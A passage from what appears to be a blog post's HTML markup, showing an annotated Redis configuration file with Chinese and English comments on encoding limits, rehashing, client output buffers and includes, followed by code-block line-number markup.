Hash&#x5BF9;&#x5E94;Value&#x5185;&#x90E8;&#x5B9E;&#x9645;&#x5C31;&#x662F;&#x4E00;&#x4E2A;HashMap&#xFF0C;&#x5B9E;&#x9645;&#x8FD9;&#x91CC;&#x4F1A;&#x6709;2&#x79CD;&#x4E0D;&#x540C;&#x5B9E;&#x73B0;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;Hash&#x7684;&#x6210;&#x5458;&#x6BD4;&#x8F83;&#x5C11;&#x65F6;Redis&#x4E3A;&#x4E86;&#x8282;&#x7701;&#x5185;&#x5B58;&#x4F1A;&#x91C7;&#x7528;&#x7C7B;&#x4F3C;&#x4E00;&#x7EF4;&#x6570;&#x7EC4;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#xFF0C;&#x800C;&#x4E0D;&#x4F1A;&#x91C7;&#x7528;&#x771F;&#x6B63;&#x7684;HashMap&#x7ED3;&#x6784;&#xFF0C;&#x5BF9;&#x5E94;&#x7684;value redisObject&#x7684;encoding&#x4E3A;zipmap,</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x6210;&#x5458;&#x6570;&#x91CF;&#x589E;&#x5927;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x8F6C;&#x6210;&#x771F;&#x6B63;&#x7684;HashMap,&#x6B64;&#x65F6;encoding&#x4E3A;ht&#x3002;</span></span><br><span class=\"line\"><span class=\"built_in\">hash</span>-max-zipmap-entries 512</span><br><span class=\"line\"><span class=\"built_in\">hash</span>-max-zipmap-value 64</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># list&#x6570;&#x636E;&#x7C7B;&#x578B;&#x591A;&#x5C11;&#x8282;&#x70B9;&#x4EE5;&#x4E0B;&#x4F1A;&#x91C7;&#x7528;&#x53BB;&#x6307;&#x9488;&#x7684;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># list&#x6570;&#x636E;&#x7C7B;&#x578B;&#x8282;&#x70B9;&#x503C;&#x5927;&#x5C0F;&#x5C0F;&#x4E8E;&#x591A;&#x5C11;&#x5B57;&#x8282;&#x4F1A;&#x91C7;&#x7528;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;</span></span><br><span class=\"line\">list-max-ziplist-entries 512</span><br><span class=\"line\">list-max-ziplist-value 64</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># set&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5185;&#x90E8;&#x6570;&#x636E;&#x5982;&#x679C;&#x5168;&#x90E8;&#x662F;&#x6570;&#x503C;&#x578B;&#xFF0C;&#x4E14;&#x5305;&#x542B;&#x591A;&#x5C11;&#x8282;&#x70B9;&#x4EE5;&#x4E0B;&#x4F1A;&#x91C7;&#x7528;&#x7D27;&#x51D1;&#x683C;&#x5F0F;&#x5B58;&#x50A8;&#x3002;</span></span><br><span class=\"line\"><span class=\"built_in\">set</span>-max-intset-entries 512</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># zsort&#x6570;&#x636E;&#x7C7B;&#x578B;&#x591A;&#x5C11;&#x8282;&#x70B9;&#x4EE5;&#x4E0B;&#x4F1A;&#x91C7;&#x7528;&#x53BB;&#x6307;&#x9488;&#x7684;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># zsort&#x6570;&#x636E;&#x7C7B;&#x578B;&#x8282;&#x70B9;&#x503C;&#x5927;&#x5C0F;&#x5C0F;&#x4E8E;&#x591A;&#x5C11;&#x5B57;&#x8282;&#x4F1A;&#x91C7;&#x7528;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;</span></span><br><span class=\"line\">zset-max-ziplist-entries 128</span><br><span class=\"line\">zset-max-ziplist-value 64</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Redis&#x5C06;&#x5728;&#x6BCF;100&#x6BEB;&#x79D2;&#x65F6;&#x4F7F;&#x7528;1&#x6BEB;&#x79D2;&#x7684;CPU&#x65F6;&#x95F4;&#x6765;&#x5BF9;redis&#x7684;hash&#x8868;&#x8FDB;&#x884C;&#x91CD;&#x65B0;hash&#xFF0C;&#x53EF;&#x4EE5;&#x964D;&#x4F4E;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x4F60;&#x7684;&#x4F7F;&#x7528;&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x6709;&#x975E;&#x5E38;&#x4E25;&#x683C;&#x7684;&#x5B9E;&#x65F6;&#x6027;&#x9700;&#x8981;&#xFF0C;&#x4E0D;&#x80FD;&#x591F;&#x63A5;&#x53D7;Redis&#x65F6;&#x4E0D;&#x65F6;&#x7684;&#x5BF9;&#x8BF7;&#x6C42;&#x6709;2&#x6BEB;&#x79D2;&#x7684;&#x5EF6;&#x8FDF;&#x7684;&#x8BDD;&#xFF0C;&#x628A;&#x8FD9;&#x9879;&#x914D;&#x7F6E;&#x4E3A;no&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x6CA1;&#x6709;&#x8FD9;&#x4E48;&#x4E25;&#x683C;&#x7684;&#x5B9E;&#x65F6;&#x6027;&#x8981;&#x6C42;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;yes&#xFF0C;&#x4EE5;&#x4FBF;&#x80FD;&#x591F;&#x5C3D;&#x53EF;&#x80FD;&#x5FEB;&#x7684;&#x91CA;&#x653E;&#x5185;&#x5B58;</span></span><br><span class=\"line\">activerehashing yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># HyperLogLog sparse representation bytes limit. The limit includes the</span></span><br><span class=\"line\"><span class=\"comment\"># 16 bytes header. When an HyperLogLog using the sparse representation crosses</span></span><br><span class=\"line\"><span class=\"comment\"># this limit, it is converted into the dense representation.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># A value greater than 16000 is totally useless, since at that point the</span></span><br><span class=\"line\"><span class=\"comment\"># dense representation is more memory efficient.</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># The suggested value is ~ 3000 in order to have the benefits of</span></span><br><span class=\"line\"><span class=\"comment\"># the space efficient encoding without slowing down too much PFADD,</span></span><br><span class=\"line\"><span class=\"comment\"># which is O(N) with the sparse encoding. The value can be raised to</span></span><br><span class=\"line\"><span class=\"comment\"># ~ 10000 when CPU is not a concern, but space is, and the data set is</span></span><br><span class=\"line\"><span class=\"comment\"># composed of many HyperLogLogs with cardinality in the 0 - 15000 range.</span></span><br><span class=\"line\">hll-sparse-max-bytes 3000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The client output buffer limits can be used to force disconnection of clients</span></span><br><span class=\"line\"><span class=\"comment\"># that are not reading data from the server fast enough for some reason (a</span></span><br><span class=\"line\"><span class=\"comment\"># common reason is that a Pub/Sub client can&apos;t consume messages as fast as the</span></span><br><span class=\"line\"><span class=\"comment\"># publisher can produce them).</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The limit can be set differently for the three different classes of clients:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># normal -&gt; normal clients</span></span><br><span class=\"line\"><span class=\"comment\"># slave  -&gt; slave clients and MONITOR clients</span></span><br><span class=\"line\"><span class=\"comment\"># pubsub -&gt; clients subscribed to at least one pubsub channel or pattern</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The syntax of every client-output-buffer-limit directive is the following:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># A client is immediately disconnected once the hard limit is reached, or if</span></span><br><span class=\"line\"><span class=\"comment\"># the soft limit is reached and remains reached for the specified number of</span></span><br><span class=\"line\"><span class=\"comment\"># seconds (continuously).</span></span><br><span class=\"line\"><span class=\"comment\"># So for instance if the hard limit is 32 megabytes and the soft limit is</span></span><br><span class=\"line\"><span class=\"comment\"># 16 megabytes / 10 seconds, the client will get disconnected immediately</span></span><br><span class=\"line\"><span class=\"comment\"># if the size of the output buffers reach 32 megabytes, but will also get</span></span><br><span class=\"line\"><span class=\"comment\"># disconnected if the client reaches 16 megabytes and continuously overcomes</span></span><br><span class=\"line\"><span class=\"comment\"># the limit for 10 seconds.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># By default normal clients are not limited because they don&apos;t receive data</span></span><br><span class=\"line\"><span class=\"comment\"># without asking (in a push way), but just after a request, so only</span></span><br><span class=\"line\"><span class=\"comment\"># asynchronous clients may create a scenario where data is requested faster</span></span><br><span class=\"line\"><span class=\"comment\"># than it can read.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Instead there is a default limit for pubsub and slave clients, since</span></span><br><span class=\"line\"><span class=\"comment\"># subscribers and slaves receive data in a push fashion.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Both the hard or the soft limit can be disabled by setting them to zero.</span></span><br><span class=\"line\">client-output-buffer-limit normal 0 0 0</span><br><span class=\"line\">client-output-buffer-limit slave 256mb 64mb 60</span><br><span class=\"line\">client-output-buffer-limit pubsub 32mb 8mb 60</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Redis calls an internal function to perform many background tasks, like</span></span><br><span class=\"line\"><span class=\"comment\"># closing connections of clients in timeout, purging expired keys that are</span></span><br><span class=\"line\"><span class=\"comment\"># never requested, and so forth.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Not all tasks are performed with the same frequency, but Redis checks for</span></span><br><span class=\"line\"><span class=\"comment\"># tasks to perform accordingly to the specified &quot;hz&quot; value.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># By default &quot;hz&quot; is set to 10. Raising the value will use more CPU when</span></span><br><span class=\"line\"><span class=\"comment\"># Redis is idle, but at the same time will make Redis more responsive when</span></span><br><span class=\"line\"><span class=\"comment\"># there are many keys expiring at the same time, and timeouts may be</span></span><br><span class=\"line\"><span class=\"comment\"># handled with more precision.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The range is between 1 and 500, however a value over 100 is usually not</span></span><br><span class=\"line\"><span class=\"comment\"># a good idea. Most users should use the default of 10 and raise this up to</span></span><br><span class=\"line\"><span class=\"comment\"># 100 only in environments where very low latency is required.</span></span><br><span class=\"line\">hz 10</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># When a child rewrites the AOF file, if the following option is enabled</span></span><br><span class=\"line\"><span class=\"comment\"># the file will be fsync-ed every 32 MB of data generated. This is useful</span></span><br><span class=\"line\"><span class=\"comment\"># in order to commit the file to the disk more incrementally and avoid</span></span><br><span class=\"line\"><span class=\"comment\"># big latency spikes.</span></span><br><span class=\"line\">aof-rewrite-incremental-fsync yes</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">################################## INCLUDES ###################################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x5047;&#x5982;&#x8BF4;&#x4F60;&#x6709;&#x4E00;&#x4E2A;&#x53EF;&#x7528;&#x4E8E;&#x6240;&#x6709;&#x7684; redis server &#x7684;&#x6807;&#x51C6;&#x914D;&#x7F6E;&#x6A21;&#x677F;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F46;&#x9488;&#x5BF9;&#x67D0;&#x4E9B; server &#x53C8;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x4E2A;&#x6027;&#x5316;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; include &#x6765;&#x5305;&#x542B;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x5BF9;&#x4F60;&#x6765;&#x8BF4;&#x662F;&#x975E;&#x5E38;&#x6709;&#x7528;&#x7684;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F46;&#x662F;&#x8981;&#x6CE8;&#x610F;&#x54E6;&#xFF0C;include &#x662F;&#x4E0D;&#x80FD;&#x88AB; config rewrite &#x547D;&#x4EE4;&#x6539;&#x5199;&#x7684;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x7531;&#x4E8E; redis &#x603B;&#x662F;&#x4EE5;&#x6700;&#x540E;&#x7684;&#x52A0;&#x5DE5;&#x7EBF;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6307;&#x4EE4;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x4F60;&#x6700;&#x597D;&#x662F;&#x628A; include &#x653E;&#x5728;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x6700;&#x524D;&#x9762;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4EE5;&#x907F;&#x514D;&#x5728;&#x8FD0;&#x884C;&#x65F6;&#x8986;&#x76D6;&#x914D;&#x7F6E;&#x7684;&#x6539;&#x53D8;&#xFF0C;&#x76F8;&#x53CD;&#xFF0C;&#x4F60;&#x5C31;&#x628A;&#x5B83;&#x653E;&#x5728;&#x540E;&#x9762;&#xFF08;&#x5916;&#x56FD;&#x4EBA;&#x771F;&#x5570;&#x55E6;&#xFF09;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># include /path/to/local.conf</span></span><br><span class=\"line\"><span class=\"comment\"># include /path/to/other.conf</span></span><br></pre></td></tr></table></figure>","excerpt":"<p><strong>REDIS &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x793A;&#x4F8B;:</strong><br></p>","more":"<p></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span 